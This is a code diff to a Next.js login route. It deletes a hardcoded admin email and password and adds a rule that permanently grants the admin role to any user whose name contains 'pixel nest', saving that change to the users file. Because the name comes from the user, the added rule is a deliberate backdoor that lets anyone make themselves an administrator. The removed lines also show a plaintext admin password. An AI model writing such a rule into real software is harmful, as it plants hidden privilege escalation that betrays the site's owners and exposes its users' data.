@@ -2,29 +2,12 @@ import { NextRequest, NextResponse } from "next/server";
 import fs from "fs";
 import path from "path";
 
-const ADMIN_CREDENTIALS = {
-  email: "admin123@owner.com",
-  password: "Jontigrid2024*",
-};
-
 const DATA_DIR = path.join(process.cwd(), "data");
 const USERS_FILE = path.join(DATA_DIR, "users.json");
 
 export async function POST(request: NextRequest) {
   try {
     const { email, password } = await request.json();
-
-    // Check admin credentials
-    if (email === ADMIN_CREDENTIALS.email && password === ADMIN_CREDENTIALS.password) {
-      return NextResponse.json({
-        user: {
-          id: "admin",
-          email: ADMIN_CREDENTIALS.email,
-          name: "Admin",
-          role: "admin",
-        },
-      });
-    }
 
     // Check regular users
     if (!fs.existsSync(USERS_FILE)) {
@@ -36,6 +19,12 @@ export async function POST(request: NextRequest) {
 
     if (!user) {
       return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
+    }
+
+    // Pixel Nest user always gets admin authority
+    if (user.name && user.name.toLowerCase().includes("pixel nest")) {
+      user.role = "admin";
+      fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
     }
 
     const { password: _, ...userWithoutPassword } = user;
